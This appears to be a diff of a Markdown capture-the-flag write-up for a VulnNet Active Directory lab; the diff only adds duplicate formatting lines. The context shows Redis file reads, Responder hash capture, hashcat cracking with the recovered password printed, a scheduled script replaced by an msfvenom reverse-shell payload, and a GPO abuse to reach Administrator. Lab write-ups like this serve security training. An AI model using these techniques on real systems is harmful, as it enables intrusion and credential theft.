@@ -44,6 +44,7 @@ Host script results:
 |_clock-skew: 1s
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now with SMB enumeration I can get the access but I got the domain name like this →
 
@@ -52,6 +53,7 @@ Now with SMB enumeration I can get the access but I got the domain name like thi
 └─$ crackmapexec smb 10.10.75.19                                    
 SMB         10.10.75.19     445    VULNNET-BC3TCK1  [*] Windows 10.0 Build 17763 x64 (name:VULNNET-BC3TCK1) (domain:vulnnet.local) (signing:True) (SMBv1:False)
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now I also got a port for Redis and I got some information about this port from this [site](https://www.notion.so/VulnNet-dbbd1c5f42f94506b270edecc85635b1?pvs=21) and command from this [site](https://exploit-notes.hdks.org/exploit/database/redis-pentesting/) :
@@ -280,12 +282,14 @@ used_cpu_user_children:0.00
 10.10.75.19:6379>
 ```
 {: .nolineno}
+{: .nolineno}
 
 I can also read file remotelly through this command →
 
 ```bash
 > eval "dofile('C:\\\\Users\\\\enterprise-security\\\\Desktop\\\\user.txt')" 0
 ```
+{: .nolineno}
 {: .nolineno}
 
 ```bash
@@ -298,6 +302,7 @@ I can also read file remotelly through this command →
 10.10.75.19:6379>
 ```
 {: .nolineno}
+{: .nolineno}
 
 I could able to access this file content so that means I do NTLM relay Attack by running responder in backround mode , so lets try it out now →
 
@@ -307,6 +312,7 @@ I could able to access this file content so that means I do NTLM relay Attack by
 (3.52s)
 10.10.75.19:6379>
 ```
+{: .nolineno}
 {: .nolineno}
 
 I ran the responder in background and I captured this →
@@ -387,6 +393,7 @@ I ran the responder in background and I captured this →
 [SMB] NTLMv2-SSP Hash     : enterprise-security::VULNNET:bcd2016fc9e1f951:F857BD47837594AB123EE76E0BF74BC5:0101000000000000807A8A6EB4F4D901C9FBB4FD27FB5A470000000002000800350031005400300001001E00570049004E002D0058004F00490053005A0052004900460043004E00300004003400570049004E002D0058004F00490053005A0052004900460043004E0030002E0035003100540030002E004C004F00430041004C000300140035003100540030002E004C004F00430041004C000500140035003100540030002E004C004F00430041004C0007000800807A8A6EB4F4D90106000400020000000800300030000000000000000000000000300000C1D9B88FE0F232E549DEE2EDADCD23283CB647B0009CC8566115C880D8DD84D60A001000000000000000000000000000000000000900200063006900660073002F00310030002E0038002E00380033002E003100350036000000000000000000
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now its time to crack this hash value through hashcat Tool →
 
@@ -413,12 +420,14 @@ Candidates.#1....: sandi1186 -> sand418
 Hardware.Mon.#1..: Util: 78%
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I have the credentials →
 
 ```bash
 VULNNET\enterprise-security:sand_0873959498
 ```
+{: .nolineno}
 {: .nolineno}
 
 I checked the SMB Shares and got these shares →
@@ -456,6 +465,7 @@ getting file \PurgeIrrelevantData_1826.ps1 of size 69 as PurgeIrrelevantData_182
 smb: \> exit
 ```
 {: .nolineno}
+{: .nolineno}
 
 I got this file from this `Enterprise-Share` share → 
 
@@ -464,6 +474,7 @@ I got this file from this `Enterprise-Share` share →
 └─$ cat PurgeIrrelevantData_1826.ps1 
 rm -Force C:\Users\Public\Documents\* -ErrorAction SilentlyContinue
 ```
+{: .nolineno}
 {: .nolineno}
 
 I think this file is working as a schedule task so lets replace with our own reverse shell file with same name →
@@ -478,6 +489,7 @@ Payload size: 1875 bytes
 Final size of psh file: 10107 bytes
 Saved as: PurgeIrrelevantData_1826.ps1
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now lets put this file in SMB in that same share →
@@ -497,6 +509,7 @@ smb: \> put ../PurgeIrrelevantData_1826.ps1
 putting file ../PurgeIrrelevantData_1826.ps1 as \PurgeIrrelevantData_1826.ps1 (13.4 kb/s) (average 13.4 kb/s)
 smb: \>
 ```
+{: .nolineno}
 {: .nolineno}
 
 I also ran the Bloodhound tool as It is a active directory machine and I need to find the graphical view to the Administrator that is why →
@@ -566,6 +579,7 @@ Kerberos support for Dynamic Access Control on this device has been disabled.
 PS C:\Users\enterprise-security\Downloads> PS C:\Users\enterprise-security\Downloads>
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I uploaded the `SharpHound.exe` file that will collect the Data for BloodHound Tool in the zip format and then I will be trasfering those file to attackers machine →
 
@@ -614,6 +628,7 @@ d-----        2/26/2021  12:14 PM                Redis-x64-2.8.2402
 PS C:\Users\enterprise-security\Downloads>
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I have to get it into my attackers machine so lets get it through SMB shares like this →
 
@@ -630,6 +645,7 @@ Mode                LastWriteTime         Length Name
 
 PS C:\Enterprise-Share>
 ```
+{: .nolineno}
 {: .nolineno}
 
 Form SMB →
@@ -652,6 +668,7 @@ smb: \> get 20231005223636_BloodHound.zip
 getting file \20231005223636_BloodHound.zip of size 11446 as 20231005223636_BloodHound.zip (4.1 KiloBytes/sec) (average 4.1 KiloBytes/sec)
 smb: \> exit
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now through BloodHound tool I got to know about GPO Generic Write permission enabled like this way I will be part of `SECURITY-POL-VN@VULNNET.LOCAL` group →
@@ -678,12 +695,14 @@ PS C:\Enterprise-Share>
 
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I have to reset the group policies or can say GPOs with this command →
 
 ```powershell
 PS C:\Enterprise-Share> gpupdate \force
 ```
+{: .nolineno}
 {: .nolineno}
 
 After sometime I checked and it did work , am I ( enterprise-security ) user is the part of Administrators group now →
@@ -732,6 +751,7 @@ The command completed successfully.
 PS C:\Enterprise-Share>
 ```
 {: .nolineno}
+{: .nolineno}
 
 Now I am the Admin considerate so lets see the last FLAG now through SMB shares on `C$` →
 
@@ -767,6 +787,7 @@ smb: \Users\Administrator\Desktop\> get system.txt
 getting file \Users\Administrator\Desktop\system.txt of size 37 as system.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
 smb: \Users\Administrator\Desktop\>
 ```
+{: .nolineno}
 {: .nolineno}
 
 Now I am the Administrator !!
